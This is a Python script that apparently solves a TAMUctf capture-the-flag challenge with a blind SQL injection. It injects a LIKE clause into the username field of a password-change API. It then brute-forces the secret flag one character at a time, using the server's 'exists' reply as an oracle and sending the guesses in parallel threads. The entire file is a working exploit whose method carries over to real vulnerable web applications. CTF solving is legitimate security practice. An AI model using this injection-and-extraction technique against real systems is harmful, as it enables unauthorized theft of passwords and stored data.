import string
import urllib.parse
import concurrent.futures
import requests

session = requests.Session()
FLAG = "gigem{"

def validate_current_password(char):
    # escape characters used by SQL's LIKE operator
    if char == "%":
        char = "\%"
    elif char == "_":
        char = "\_"
    
    # setting up request
    url = f"http://logical.tamuctf.com/api/chpass"
    headers = { "Content-Type": "application/x-www-form-urlencoded" }
    user_input = "admin' AND password LIKE '" + FLAG + char + "%';"
    data = f"username={urllib.parse.quote(user_input)}"
    response = session.post(url, headers=headers, data=data)
    
    # not exists
    if response.status_code != 200:
        return None
    
    content = response.json()["res"]
    if content != "exists":
        return None
    
    # exists
    return char


added = True # check to stop loop when looped all ASCII characters and did not append to flag
# brute force
while not FLAG.endswith("}") and added == True:
    added = False
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(validate_current_password, c) for c in string.printable]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == None:
                continue
            FLAG += result
            added = True
            print(FLAG)
            executor.shutdown(wait=True, cancel_futures=True)
            break
        
    if added == False:
        break

print(f"Final flag: {FLAG}")
print("Done")
